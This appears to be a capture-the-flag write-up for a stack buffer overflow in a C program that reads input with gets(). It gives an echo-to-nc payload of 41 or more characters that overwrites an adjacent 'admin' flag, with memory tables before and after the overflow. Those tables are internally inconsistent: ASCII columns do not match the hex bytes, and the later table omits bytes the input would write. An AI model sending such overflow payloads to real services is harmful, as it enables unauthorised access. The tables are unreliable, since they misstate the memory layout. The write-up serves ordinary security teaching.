
## Writeup

The source [file](../src/vuln.c) contain two variables located on the stack; `name` and `admin`.
`name` is the 32-bytes sized input buffer we are writing into with the vulnerable function `gets()`.
`admin` is our overflow target variable which we want to overwrite with any other value than `"\0"` as input.

The following is a depiction of the stack:

|  Mem.Addr./Variables |  Hex-values (8 bytes/row) |      Ascii Characters    |
|---------------------:|:-------------------------:|:------------------------:|
|                  rip |  00 7f fd 13 76 d6 ff 00  |   .  .  ý  .  v  Ö  ÿ  . |
|                  rbp |  00 7f ff f1 37 6d 88 00  |   .  .  ÿ  ñ  7  m  .  . |
|  &admin / &name + 40 |  00 00 00 00 00 00 00 00  |  \0 \0 \0 \0 \0 \0 \0 \0 |
| padding / &name + 32 |  00 00 00 00 00 00 00 00  |  \0 \0 \0 \0 \0 \0 \0 \0 |
|           &name + 24 |  02 00 00 00 00 00 00 00  |   . \0 \0 \0 \0 \0 \0 \0 |
|           &name + 16 |  ff fb 8b 1f 00 00 00 00  |   Ù  E  æ  J  ü  .  .  . |
|           &name +  8 |  d9 45 e6 4a fc 7f 00 00  |  \0  E \0  J \0 \0 \0 \0 |
|           &name      |  64 00 00 00 00 00 00 00  |   d \0 \0 \0 \0 \0 \0 \0 |

Therefore, we need to input at least 41 characters where the 41st one is not `"\0"`, e.g.
```bash
echo "0000111122223333444455556666777788889999<non-zero-bytes>" | nc <host> 9001
```

And this will edit the above table into:

|  Mem.Addr./Variables |  Hex-values (8 bytes/row) |     Ascii Characters     |
|---------------------:|:-------------------------:|:------------------------:|
|                  rip |  00 7f fd 13 76 d6 ff 00  |   .  .  ý  .  v  Ö  ÿ  . |
|                  rbp |  00 7f ff f1 37 6d 88 00  |   .  .  ÿ  ñ  7  m  .  . |
|  &admin / &name + 40 |  00 00 00 00  {non-zero}  |  \0 \0 \0 \0  {non-zero} |
| padding / &name + 32 |  00 00 00 00 00 00 00 00  |  \0 \0 \0 \0 \0 \0 \0 \0 |
|           &name + 24 |  37 37 37 37 36 36 36 36  |   7  7  7  7  6  6  6  6 |
|           &name + 16 |  35 35 35 35 34 34 34 34  |   5  5  5  5  4  4  4  4 |
|           &name +  8 |  33 33 33 33 32 32 32 32  |   3  3  3  3  2  2  2  2 |
|           &name      |  31 31 31 31 30 30 30 30  |   1  1  1  1  0  0  0  0 |

Compile and run this test [file](dump.c) for a more code and output explanation.
